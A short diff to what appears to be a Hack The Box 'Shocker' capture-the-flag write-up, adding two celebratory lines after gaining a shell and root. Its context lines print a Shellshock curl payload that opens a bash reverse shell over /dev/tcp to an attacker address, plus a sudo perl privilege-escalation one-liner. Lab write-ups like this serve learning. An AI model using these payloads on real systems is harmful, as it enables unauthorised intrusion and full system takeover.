@@ -132,6 +132,8 @@ curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Shocker/Untitled%209.png)
 
+**HABEMUS SHELL!!!**
+
 # Post Exploration
 
 ## Privilege Escalation (shelly → root)
@@ -153,6 +155,8 @@ sudo perl -e 'exec "/bin/bash";'
 ```
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Shocker/Untitled%2012.png)
+
+**HABEMUS ROOT!!!**
 
 # Get Shell - Script Automation
 
